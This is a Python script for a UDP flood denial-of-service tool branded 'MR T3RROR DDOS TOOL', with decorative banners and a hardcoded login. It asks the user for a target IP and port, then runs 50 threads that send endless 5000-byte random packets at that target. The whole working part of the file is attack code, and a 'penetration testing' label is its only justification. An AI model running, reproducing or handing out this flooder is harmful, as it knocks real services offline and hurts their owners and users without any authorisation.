import os
import time
import socket
import random
import threading
import logging
from datetime import datetime

# Setup logging
logging.basicConfig(filename='ddos_tool.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def print_logo():
    os.system("clear")
    print("\033[92m")
    print("   ╔════════════════════════════════╗")
    print("   ║    MR T3RROR DDOS TOOL         ║")
    print("   ║ CIVILIAN CYBER EXPERT FORCE ║")
    print("   ╚════════════════════════════════╝")
    print("\n")

def login():
    print("\033[92m")
    print("   ╔════════════════════════════╗")
    print("   ║      LOGIN TO CONTINUE     ║")
    print("   ╚════════════════════════════╝")
    attempts = 0
    while attempts < 3:
        username = input("\n   ➤ Enter Username: ")
        password = input("   ➤ Enter Password: ")
        if username == "CCEF" and password == "CCEF":
            print("\n   ✅ Login Successful!\n")
            time.sleep(1)
            os.system("clear")
            return True
        else:
            attempts += 1
            print(f"\n   ❌ Invalid Credentials! Attempts Left: {3 - attempts}\n")
    print("\n   ❌ Access Denied! Exiting...\n")
    exit()

def loading_bar():
    print("\033[91m")
    for i in range(101):
        time.sleep(0.01)  # Faster loading
        print(f"\r   ➤ Loading: [{'#' * (i//5)}{' ' * (20 - (i//5))}] {i}%", end='', flush=True)
    print("\n\n")

def get_target_details():
    print("\033[93m")
    print("   ╔══════════════════════════════════════════╗")
    print("   ║          ENTER TARGET DETAILS            ║")
    print("   ╚══════════════════════════════════════════╝")
    while True:
        try:
            url = input("\n   ➤ Enter Target Website URL: ")
            ip = input("   ➤ Enter Target IP Address: ")
            port = int(input("   ➤ Enter Target Port Number: "))
            if not (1 <= port <= 65535):
                raise ValueError("Port number must be between 1 and 65535.")
            break
        except ValueError as e:
            print(f"   ❌ Error: {e}. Please enter valid values.")
    print("\n   ✅ Details received successfully.\n")
    return url, ip, port

def print_ddos_banner():
    print("\033[96m")
    print("   ╔══════════════════════════════════════════╗")
    print("   ║        MR T3RROR DDOS TOOL               ║")
    print("   ║  POWERFUL ATTACKS FOR PENETRATION TESTING ║")
    print("   ╚══════════════════════════════════════════╝")
    print("\n")

def send_packet(sock, ip, port, packet_size):
    """Function to send a single packet with random data"""
    bytes = random._urandom(packet_size)  # Larger packet size
    sock.sendto(bytes, (ip, port))

def flood_attack(ip, port, packet_size, threads_count):
    """Function to perform a flooding attack with threading for parallel execution"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    print(f"\n   🚀 DDoS Attack started on {ip} through port {port}")
    logging.info(f"DDoS Attack started on {ip} through port {port}")

    # Threaded attack
    def attack_thread():
        packet_count = 0
        while True:
            send_packet(sock, ip, port, packet_size)
            packet_count += 1
            print(f"\033[35m   ➤ Sent packet #{packet_count} to {ip} on port {port}")

    # Creating multiple threads for parallel packet sending
    threads = []
    for _ in range(threads_count):
        thread = threading.Thread(target=attack_thread)
        threads.append(thread)
        thread.start()

    # Wait for threads to finish
    for thread in threads:
        thread.join()

def main():
    print_logo()
    if login():
        print_ddos_banner()
        loading_bar()
        url, ip, port = get_target_details()

        # Set custom parameters for stronger attack
        packet_size = 5000  # Increase packet size to 5000 bytes (Can be adjusted further)
        threads_count = 50  # Use 50 threads for a stronger attack

        flood_attack(ip, port, packet_size, threads_count)
    else:
        print("\033[91m   ❌ Access Denied! Please try logging in again.")

if __name__ == "__main__":
    main()